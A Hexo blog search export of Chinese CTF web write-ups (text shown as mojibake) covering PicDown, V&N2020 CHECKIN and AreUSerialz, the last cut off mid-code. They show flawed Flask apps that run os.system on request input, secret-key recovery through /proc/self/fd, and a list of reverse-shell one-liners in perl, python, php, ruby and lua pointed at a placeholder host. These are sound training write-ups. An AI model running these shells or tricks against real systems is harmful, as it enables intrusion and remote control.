<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020ç½‘é¼æ¯PicDownã€V&amp;N2020CHECKINï¼ˆæ–‡ä»¶æè¿°ç¬¦ã€å¼¹shellï¼‰</title>
    <url>/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/</url>
    <content><![CDATA[<h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>1.<a href="https://blog.csdn.net/mediatec/article/details/88578101" target="_blank" rel="noopener">Linux procç›®å½•è¯¦è§£</a></p>
<blockquote>
<p>procæ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåªå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚å®ƒä»¥æ–‡ä»¶ç³»ç»Ÿçš„æ–¹å¼ä¸ºè®¿é—®ç³»ç»Ÿå†…æ ¸æ•°æ®çš„æ“ä½œæä¾›æ¥å£ã€‚</p>
<p>selfç›®å½•æ˜¯è¯»å–è¿›ç¨‹æœ¬èº«çš„ä¿¡æ¯æ¥å£</p>
<p>cmdline å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤</p>
<p>fd åŒ…å«å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·é“¾æ¥</p>
</blockquote>
<p>2.<a href="https://blog.csdn.net/cywosp/article/details/38965239" target="_blank" rel="noopener">æ–‡ä»¶æè¿°ç¬¦</a></p>
<blockquote>
<p>æ–‡ä»¶æè¿°ç¬¦ï¼Œåœ¨linuxé‡Œï¼Œå½“ä¸€ä¸ªè¿›ç¨‹æ‰“å¼€æŸä¸ªæ–‡ä»¶ç›´åˆ°å…³é—­å‰ï¼Œè¯¥è¿›ç¨‹ä¼šè·å¾—æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œæ–‡ä»¶æè¿°ç¬¦é‡Œæœ‰æ–‡</p>
<p>ä»¶çš„å†…å®¹ï¼Œå³ä¾¿å·²ç»å°†æ–‡ä»¶åˆ é™¤ï¼Œåªæ˜¯åˆ é™¤äº†å…¶ç›¸åº”çš„ç›®å½•ç´¢å¼•èŠ‚ç‚¹ï¼Œè‹¥è¿›ç¨‹ä¾ç„¶å­˜åœ¨æ²¡è¢«å…³é—­çš„è¯ï¼Œå°±ä¾ç„¶å¯</p>
<p>ä»¥é€šè¿‡æ–‡ä»¶æä¾›ç»™å®ƒçš„æ–‡ä»¶æè¿°ç¬¦è¿›è¡Œæ“ä½œã€‚/proc/[pid]/fd è¿™ä¸ªç›®å½•é‡ŒåŒ…å«äº†è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µã€‚pidå°±æ˜¯è¿›ç¨‹</p>
<p>è®°å½•çš„æ‰“å¼€æ–‡ä»¶çš„åºå·ã€‚</p>
<p>è½¬è‡ª<a href="https://www.cnblogs.com/Wanghaoran-s1mple/p/12514481.html" target="_blank" rel="noopener">https://www.cnblogs.com/Wanghaoran-s1mple/p/12514481.html</a></p>
</blockquote>
<p>3.pythonç›¸å…³å‡½æ•°çš„äº†è§£ï¼ˆlower()ã€startswith()ã€urlopen()â€¦â€¦ï¼‰</p>
<p>4.<a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">åå¼¹shell</a>çš„å‡ ç§æ“ä½œï¼ˆå¸¸ç”¨bashã€ncã€curlã€pythonã€perlã€phpï¼‰</p>
<h3 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown"></a>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h3><p>å°è¯•åŒ…å«ä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç°å¯ä»¥è¯»å–ï¼Œå¹¶ä»¥jpgçš„å½¢å¼ä¸‹è½½ä¸‹æ¥ï¼ˆç›´æ¥è¯»<code>/flag</code>å°±å¾—åˆ°flagäº†â€¦.ä¸è¿‡æ˜¾ç„¶è¦å¥½å¥½åšï¼‰</p>
<p>äºæ˜¯æŠ“åŒ…ï¼Œå°è¯•è¯»å–cmdline</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>å‘ç°app.pyï¼Œè¯»å–ä¸€ä¸‹ï¼Œå¾—åˆ°ä¸‹é¢æºç </p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/2.png" src="/img/loading.gif" class="lazyload"></a>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">"/tmp/secret.txt"</span></span><br><span class="line">f = open(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'search.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/page')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">"file"</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">'application/octet-stream'</span>)</span><br><span class="line">            response.headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=beautiful.jpg'</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">"HACK ERROR!"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">"SOMETHING WRONG!"</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'search.html'</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/no_one_know_the_manager')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span><span class="params">()</span>:</span></span><br><span class="line">    key = request.args.get(<span class="string">"key"</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">"shell"</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">"ok"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">"Wrong Key!"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure></div>

<p>æœ‰ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œå‘<code>/no_one_know_the_manager</code>ä¸­ä¼ å…¥<code>key</code>å’Œ<code>shell</code>å‚æ•°å¯ä»¥é€šè¿‡<code>os.system(shell)</code>ï¼Œæ¥å–å¾—shell</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/no_one_know_the_manager')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span><span class="params">()</span>:</span></span><br><span class="line">    key = request.args.get(<span class="string">"key"</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">"shell"</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">"ok"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">"Wrong Key!"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></div>

<p>ä½†æ˜¯å…¶ä¸­çš„<code>key</code>å‚æ•°è¦ç­‰äº<code>SECRET_KEY</code>ï¼Œä¹Ÿå°±æ˜¯<code>/tmp/secret.txt</code>ä¸­çš„å†…å®¹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SECRET_FILE = <span class="string">"/tmp/secret.txt"</span></span><br><span class="line">f = open(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬å°è¯•è¯»å–æ—¶ï¼Œå‘ç°è¯»ä¸å‡ºæ¥å†…å®¹ï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶å·²ç»è¢«<code>os.remove(SECRET_FILE)</code>åˆ é™¤äº†ï¼Œä½†æ˜¯å› ä¸ºè¿™ä¸ªæ–‡ä»¶è¿˜æ˜¯æ‰“å¼€çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘é€šè¿‡æ–‡ä»¶æè¿°ç¬¦<code>/proc/self/fd/3</code>æ¥è¯»å–</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¾—åˆ°<code>key</code>çš„å€¼ï¼Œä¸‹ä¸€æ­¥åå¼¹shellï¼Œå› ä¸ºæ²¡å›æ˜¾ï¼Œåªæ˜¾ç¤º<code>ok</code></p>
<p>å°è¯•äº†bashå’Œncéƒ½ä¸è¡Œï¼Œåœ¨vpsä¸ŠåŒ…å«ä¸ªbashä¸€å¥è¯ï¼Œæ‹¿curlè¿æˆåŠŸäº†</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¦‚æœé‡åˆ°keyä¸­æœ‰åŠ å·<code>+</code>ï¼Œå°±æ‹¿<code>%2B</code>æ¥ä»£æ›¿ï¼Œæœ€åæ”¾ä¸€ä¸‹vpsä¸Šçš„æ“ä½œå’Œbashä¸€å¥è¯</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/5.png" src="/img/loading.gif" class="lazyload"></a>

<p>è¿™é¢˜wpæ‹–çš„æ—¶é—´æœ‰ã€é•¿äº†ï¼Œå¼€äº†ä¸‰æ¬¡é¢˜ç›®ï¼Œä¸‰æ¬¡é¶æœºï¼ˆä¸­é—´ä¸Šä¿¡å·å»äº†ã€‚ã€‚ï¼‰</p>
<h3 id="V-amp-N2020-å…¬å¼€èµ›-CHECKIN"><a href="#V-amp-N2020-å…¬å¼€èµ›-CHECKIN" class="headerlink" title="[V&amp;N2020 å…¬å¼€èµ›]CHECKIN"></a>[V&amp;N2020 å…¬å¼€èµ›]CHECKIN</h3><p>å¼€é¢˜åå¾—åˆ°æºç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure></div>

<p>shellå‡½æ•°å¯ä»¥åˆ©ç”¨</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br></pre></td></tr></table></figure></div>

<p>äºæ˜¯æŠ“åŒ…ä¼ å…¥å‚æ•°<code>c</code>ï¼Œå‘ç°åªæœ‰<code>return &quot;1&quot;</code>ï¼Œæ²¡æœ‰å‘½ä»¤å›æ˜¾</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/6.png" src="/img/loading.gif" class="lazyload"></a>

<p>æ‰€ä»¥åå¼¹shellï¼Œè¿™æ¬¡bashã€curlå’Œncéƒ½ä¸èƒ½ç”¨å–½ï¼Œå»ç½‘ä¸Šæ‰¾å‡ æ¡å‘½ä»¤</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="xx.xx.xx.xx";$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xx.xx.xx.xx:xxxx");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xx.xx.xx",xxxx));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line">python -c <span class="string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('xx.xx.xx.xx',xxxx))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span></span><br><span class="line">php -r <span class="string">'$sock=fsockopen("xx.xx.xx.xx",xxxx);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("xx.xx.xx.xx",xxxx).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("xx.xx.xx.xx",xxxx);while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('xx.xx.xx.xx','xxxx');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure></div>

<p>è®°å¾—ä¼ å‚æ—¶å…ˆè¿›è¡Œä¸€éurlç¼–ç ï¼ˆå‰ä¸¤ä¸ªéƒ½å¯ä»¥ç”¨ï¼Œåé¢çš„å°±è¯•äº†ä¸ªpythonä¸è¡Œï¼Œæ‡’å¾—è¯•äº†ã€‚ã€‚ï¼‰</p>
<a href="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>æœ€åä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦å’Œé€šé…ç¬¦ï¼Œå³<code>/proc/*/fd/*</code>å¾—åˆ°flagï¼ˆè¯•äº†å¾ˆå¤šæ¬¡ï¼Œå±•ç¤ºæœ€ç›´æ¥çš„ä¸€æ¬¡å¾—äº†ï¼‰</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Web</tag>
        <tag>å¼¹shell</tag>
        <tag>æ–‡ä»¶æè¿°ç¬¦</tag>
      </tags>
  </entry>
  <entry>
    <title>2020ç½‘é¼AreUSerialzã€è™šå¹»2</title>
    <url>/2020/05/17/2020%E7%BD%91%E9%BC%8EAreUSerialz%E3%80%81%E8%99%9A%E5%B9%BB2/</url>
    <content><![CDATA[<h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><p>ä¸€ä¸ªååºåˆ—åŒ–é—®é¢˜æ²¡æœ‰é‚£ä¹ˆå¤šçš„åµŒå¥—ï¼Œä¸è¿‡æœ‰å‡ ä¸ªå°çš„ç»•è¿‡</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 